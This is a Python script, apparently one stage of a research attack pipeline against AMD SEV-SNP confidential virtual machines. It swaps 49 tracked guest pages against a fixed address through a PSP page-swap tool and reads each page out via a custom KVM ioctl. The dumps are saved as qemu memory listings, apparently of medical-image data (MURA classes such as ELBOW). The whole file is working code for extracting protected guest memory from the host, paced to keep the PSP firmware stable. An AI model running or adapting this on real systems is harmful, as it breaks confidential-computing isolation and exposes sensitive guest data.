#!/usr/bin/env python3
"""
stage3_swap_dump.py — Stage 3: PSP 49-Page Sequential Collision Swap & Dump.

Loads tracked 49-page GPAs from Stage 2 and FIXED_GPA from Stage 1.
Sequentially collides and dumps each of the 49 pages against FIXED_GPA using
swap_pages_tool with --swap-back safety to preserve guest VM integrity.

Outputs:
  - {class}_{index}_p{00..48}.out (dump files)
  - swap_meta_{index}.json (swap execution metadata)

Usage:
    sudo python3 stage3_swap_dump.py --index 0 [--output-dir .]
"""

import argparse
import ctypes
import fcntl
import json
import os
import subprocess
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
import common as c

_KVMIO = 0xAE
KVM_READ_PAGE_DUMP = (0x80000000 | ((c.PAGE_SIZE & 0x3FFF) << 16) | (_KVMIO << 8) | 0x2b)

# PSP command-rate pacing for SEV-SNP stability:
# PSP firmware resets/reboots if sustained commands exceed ~60 cmd/sec.
# Each swap-back executes ~12 PSP commands.
# 0.25s pacing -> ~48 cmds/sec max.
# Every 10 swaps, mandatory 2.0s burst cooldown to allow PSP queue to drain.
SWAP_PACE_SEC       = 0.25
SWAP_BURST_COOLDOWN = 10
SWAP_BURST_SLEEP    = 2.0


def _bytes_to_xp(gpa: int, raw: bytes) -> str:
    lines = [f"(qemu) xp /512gx 0x{gpa:x}"]
    for i in range(0, c.PAGE_SIZE, 16):
        lo = int.from_bytes(raw[i:i+8], "little")
        hi = int.from_bytes(raw[i+8:i+16], "little")
        lines.append(f"{gpa+i:016x}: 0x{lo:016x} 0x{hi:016x}")
    return "\n".join(lines)


def do_swap_read(dict_gpa: int, src_gpa: int, out_path: Path,
                 swap_tool: Path = c.SWAP_TOOL_PATH,
                 kvm_dev: str = "/dev/kvm") -> bool:
    """Perform PSP swap-back and read kernel dump to output file."""
    cmd = [str(swap_tool), f"0x{dict_gpa:x}", f"0x{src_gpa:x}", "--swap-back"]
    rc = subprocess.run(cmd).returncode
    if rc != 0:
        print(f"[stage3] [!] swap_pages_tool failed (exit {rc}) for GPA 0x{src_gpa:x}", file=sys.stderr)
        return False

    kvm_fd = os.open(kvm_dev, os.O_RDWR | os.O_CLOEXEC)
    try:
        buf = ctypes.create_string_buffer(c.PAGE_SIZE)
        fcntl.ioctl(kvm_fd, KVM_READ_PAGE_DUMP, buf)
        raw = bytes(buf)
    finally:
        os.close(kvm_fd)

    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_text(_bytes_to_xp(dict_gpa, raw) + "\n")
    return True


def run_stage3(index: int, output_dir: Path, mock: bool = False) -> Dict:
    """Execute Stage 3."""
    output_dir.mkdir(parents=True, exist_ok=True)
    c.ensure_guest_suppressions()
    tracked_path = output_dir / f"tracked_mura_{index}.json"
    dict_meta_path = output_dir / "ref_dict.json"
    swap_meta_path = output_dir / f"swap_meta_{index}.json"

    if not tracked_path.exists():
        raise FileNotFoundError(f"Missing {tracked_path} — run Stage 2 first.")

    tracked = c.load_json(tracked_path)
    target_class = tracked.get("target_class", "ELBOW")
    pages = tracked.get("channel_pages_int", [])

    if not dict_meta_path.exists():
        # Fall back to dict_cache_mura.json
        if c.DICT_CACHE_FILE.exists():
            dict_cache = c.load_json(c.DICT_CACHE_FILE)
            fixed_gpa = int(dict_cache.get("fixed_gpa", "0x0"), 16)
        else:
            fixed_gpa = 0x140b3a000
    else:
        dict_meta = c.load_json(dict_meta_path)
        fixed_gpa = int(dict_meta.get("fixed_gpa", "0x0"), 16)

    print(f"[stage3] Target: {target_class} (Index {index}), FIXED_GPA: 0x{fixed_gpa:x}, Pages: {len(pages)}")

    dump_files = []
    successful_pages = 0
    t0 = time.time()

    for k, page_gpa in enumerate(pages):
        out_file = output_dir / f"{target_class}_{index}_p{k:02d}.out"
        if mock:
            # Generate mock dump for testing pipeline without root/PSP
            out_file.write_text(f"(qemu) xp /512gx 0x{fixed_gpa:x}\n{fixed_gpa:016x}: 0x0 0x0\n")
            dump_files.append(str(out_file))
            successful_pages += 1
            continue

        if k > 0:
            if SWAP_BURST_COOLDOWN > 0 and k % SWAP_BURST_COOLDOWN == 0:
                time.sleep(SWAP_BURST_SLEEP)
            elif SWAP_PACE_SEC > 0:
                time.sleep(SWAP_PACE_SEC)

        ok = do_swap_read(fixed_gpa, page_gpa, out_file)
        if ok:
            dump_files.append(str(out_file))
            successful_pages += 1
            print(f"  [{k+1:2d}/{len(pages)}] Dumped page 0x{page_gpa:x} → {out_file.name}")
        else:
            print(f"  [{k+1:2d}/{len(pages)}] FAILED page 0x{page_gpa:x}")

    # Signal guest that swap-back read is complete so it can safely proceed/exit
    c.ssh_run("touch /tmp/host_read_done")

    elapsed = time.time() - t0
    capture_fraction = successful_pages / c.IMG_PAGES

    meta = {
        "stage": 3,
        "index": index,
        "target_class": target_class,
        "fixed_gpa": hex(fixed_gpa),
        "total_requested_pages": len(pages),
        "successful_pages": successful_pages,
        "capture_fraction": capture_fraction,
        "is_partial": capture_fraction < 1.0,
        "dump_files": dump_files,
        "elapsed_sec": round(elapsed, 2),
        "timestamp": time.time(),
    }
    c.save_json(swap_meta_path, meta)
    print(f"[stage3] Completed 49-page swap dump in {elapsed:.1f}s (Frac: {capture_fraction:.3f}) → {swap_meta_path}")
    return meta


def main():
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--index", type=int, default=0, help="MURA study / sample index")
    p.add_argument("--mock", action="store_true", help="Generate synthetic dumps without PSP swap (testing)")
    p.add_argument("--output-dir", default=str(HERE), help="Directory to save dumps and metadata")
    args = p.parse_args()

    run_stage3(args.index, Path(args.output_dir), mock=args.mock)


if __name__ == "__main__":
    main()
